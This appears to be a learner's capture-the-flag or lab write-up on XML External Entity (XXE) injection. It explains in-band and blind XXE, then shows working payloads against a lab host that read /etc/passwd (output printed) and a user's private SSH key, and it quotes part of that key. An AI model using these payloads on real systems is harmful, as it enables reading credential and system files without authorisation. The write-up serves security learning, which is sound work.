# 04. XML External Entity - Exploiting

[Part 1. Before we start]

What is XML external entity injection?

- XML external entity injection (also known as XXE) is a web security vulnerability that allows an attacker to interfere with an application's processing of XML data. It often allows an attacker to view files on the server, and to interact with backend or external systems that the application itself can access.
- They can also cause Denial of Service (DoS) attack or could use XXE to perform Server-Side Request Forgery (SSRF) inducing the web application to make requests to other applications. XXE may even enable port scanning and lead to remote code execution.

There are two types of XXE attacks: in-band and out-of-band (OOB-XXE).

1. An in-band XXE attack is the one in which the attacker can receive an immediate response to the XXE payload.
2. out-of-band XXE attacks (also called blind XXE), there is no immediate response from the web application and attacker has to reflect the output of their XXE payload to some other file or their own server.

[Part 2. Exploit]

Target: http://10.10.106.3/

- Firstly, we just try a simple payload to display my name

```
// It defines an entity named name with the replacement text "hieu"
<!DOCTYPE replace [<!ENTITY name "hieu"> ]>
<userInfo>
<firstName>vu</firstName>
//entity reference replaced with the value defined in the external entity declaration, which is "hieu"
<lastName>&name;</lastName>
</userInfo>
```

- I don’t really learn about xml much but it’s like we define a variable with specific value
- Now i try to read the file /etc/passwd with the uri: file:///etc/passwd

```
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY payload SYSTEM "file:///etc/passwd"> ]>
<userInfo>
<firstName>vu</firstName>
<lastName>&payload;</lastName>
</userInfo>
```

+) The output:

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
.......
falcon:x:1000:1000:falcon:/home/falcon:/bin/bash
```

- The name of  the user in /etc/passwd is falcon
- After researching, i know that default location for ssh key is `(/home/USER/.ssh/id_rsa)` .

[https://www.hostdime.com/kb/hd/linux-server/the-guide-to-generating-and-uploading-ssh-keys#:~:text=The default directory for SSH,the public key named id_rsa](https://www.hostdime.com/kb/hd/linux-server/the-guide-to-generating-and-uploading-ssh-keys#:~:text=The%20default%20directory%20for%20SSH,the%20public%20key%20named%20id_rsa).

- And we all knows that falcon is in the dir /home/falcon

```
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY payload SYSTEM "file:///home/falcon/.ssh/id_rsa"> ]>
<userInfo>
<firstName>vu</firstName>
<lastName>&payload;</lastName>
</userInfo>
```

+) Or you can use the payload shorter like this  

```
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///home/falcon/.ssh/id_rsa'>]>
<root>&read;</root>
```

⇒  falcon's SSH key located is located at **/home/falcon/.ssh/id_rsa** and the first 18 characters for falcon's private key is **MIIEogIBAAKCAQEA7b**
